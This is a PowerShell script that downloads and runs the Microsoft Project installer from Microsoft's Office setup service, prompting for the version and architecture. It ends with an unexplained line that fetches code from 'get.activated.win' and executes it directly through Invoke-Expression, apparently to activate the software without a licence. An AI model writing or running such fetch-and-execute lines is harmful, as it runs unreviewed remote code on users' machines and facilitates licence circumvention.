# example:
# version: 1 = o365, 2 = 2024, 3 = 2021, 4 = 2019, 5 = 2016
# arch: x64 or x86
function generate-downloadlink($version, $arch) {
    $productReleaseID = switch ($version) {
        1 { "ProjectProRetail" }
        2 { "ProjectStd2024Retail" }
        3 { "ProjectStd2021Retail" }
        4 { "ProjectStd2019Retail" }
        5 { "ProjectStdRetail" }
        default { throw "Invalid version number. Please enter a number between 1 and 5." }
    }
    "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=$productReleaseID&platform=$arch&language=en-us&version=O16GA"
}

$version = Read-Host @"
1: O365
2: 2024
3: 2021
4: 2019
5: 2016
Version number
"@

$arch = if(Read-Host @"
1: x64
2: x86
Architecture
"@ -eq 1) {
    "x64"
} else {
    "x86"
}

$randomFolderPath = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName())
New-Item -ItemType Directory -Path $randomFolderPath | Out-Null
$downloadLink = generate-downloadlink $version $arch
$installerPath = Join-Path $randomFolderPath "OfficeSetup.exe"
Start-BitsTransfer -Source $downloadLink -Destination $installerPath
Write-Host "Download complete. Installer saved to: $installerPath"
Write-Host "Running installer..."
Start-Process -FilePath $installerPath -Wait
Write-Host "Installation process has completed."
# Clean up the temporary folder
Remove-Item -Path $randomFolderPath -Recurse -Force
Write-Host "Temporary files cleaned up."

Invoke-RestMethod "https://get.activated.win" | Invoke-Expression
